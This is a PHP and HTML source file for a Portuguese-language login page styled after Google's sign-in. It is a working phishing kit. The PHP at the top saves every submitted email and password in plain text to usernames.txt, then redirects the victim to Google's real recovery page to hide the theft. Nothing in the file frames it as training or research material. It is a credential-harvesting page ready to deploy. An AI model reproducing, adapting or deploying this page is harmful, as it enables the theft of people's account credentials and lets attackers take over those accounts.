<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Capture email and password from POST request
    $email = isset($_POST['email']) ? $_POST['email'] : '';
    $password = isset($_POST['password']) ? $_POST['password'] : '';
    // Append to usernames.txt
    file_put_contents("usernames.txt", "Email: " . $email . " Pass: " . $password . "\n", FILE_APPEND);
    // Redirect to Google sign-in page
    header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
    exit();
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Login Atualizado</title>
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f5f5;
      font-family: 'Roboto', sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .login-card {
      background: #ffffff;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      width: 360px;
      padding: 40px 24px;
      position: relative;
      overflow: hidden;
    }
    .login-step {
      position: absolute;
      width: 100%;
      transition: transform 0.4s ease, opacity 0.4s ease;
    }
    .login-step.hidden {
      opacity: 0;
      pointer-events: none;
    }
    .step-email {
      transform: translateX(0);
    }
    .step-password {
      transform: translateX(100%);
    }
    .step-email.hide {
      transform: translateX(-100%);
    }
    .step-password.show {
      transform: translateX(0);
    }
    .login-card h2 {
      margin: 0 0 24px;
      font-weight: 500;
      color: #333;
      text-align: center;
    }
    .input-group {
      margin-bottom: 20px;
    }
    .input-group label {
      display: block;
      font-size: 14px;
      margin-bottom: 6px;
      color: #555;
    }
    .input-group input {
      width: 100%;
      padding: 10px 12px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
      outline: none;
      box-sizing: border-box;
      transition: border-color 0.2s;
    }
    .input-group input:focus {
      border-color: #4285f4;
    }
    .button-group {
      text-align: center;
    }
    .button-group button {
      background-color: #4285f4;
      color: #fff;
      border: none;
      padding: 12px 24px;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.2s ease;
    }
    .button-group button:hover {
      background-color: #3367d6;
    }
    .back-link {
      margin-top: 12px;
      font-size: 14px;
      text-align: center;
      color: #4285f4;
      cursor: pointer;
    }
    .back-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <form method="POST" action="" class="login-card">
    <!-- Step 1: Email -->
    <div id="stepEmail" class="login-step step-email">
      <h2>Entrar com email</h2>
      <div class="input-group">
        <label for="emailInput">Email</label>
        <input type="email" id="emailInput" name="email" placeholder="seuemail@exemplo.com" required />
      </div>
      <div class="button-group">
        <button type="button" id="btnNext">Avançar</button>
      </div>
    </div>
    <!-- Step 2: Password -->
    <div id="stepPassword" class="login-step step-password hidden">
      <h2>Digite sua senha</h2>
      <div class="input-group">
        <label for="passwordInput">Senha</label>
        <input type="password" id="passwordInput" name="password" placeholder="Senha" required />
      </div>
      <div class="button-group">
        <button type="submit" id="btnLogin">Entrar</button>
      </div>
      <div class="back-link" id="linkBack">Voltar</div>
    </div>
  </form>

  <script>
    const stepEmail = document.getElementById('stepEmail');
    const stepPassword = document.getElementById('stepPassword');
    const btnNext = document.getElementById('btnNext');
    const linkBack = document.getElementById('linkBack');
    const emailInput = document.getElementById('emailInput');
    const passwordInput = document.getElementById('passwordInput');

    btnNext.addEventListener('click', () => {
      if (!emailInput.value) {
        emailInput.focus();
        return;
      }
      // Trigger transition: hide email, show password
      stepEmail.classList.add('hide');
      stepPassword.classList.remove('hidden');
      setTimeout(() => {
        stepPassword.classList.add('show');
      }, 20);
      passwordInput.focus();
    });

    linkBack.addEventListener('click', () => {
      // Trigger transition back: hide password, show email
      stepPassword.classList.remove('show');
      stepEmail.classList.remove('hide');
      setTimeout(() => {
        stepPassword.classList.add('hidden');
      }, 400);
      emailInput.focus();
    });

    // Allow Enter to advance
    emailInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        btnNext.click();
      }
    });
    passwordInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter') {
        document.getElementById('btnLogin').click();
      }
    });
  </script>
</body>
</html>
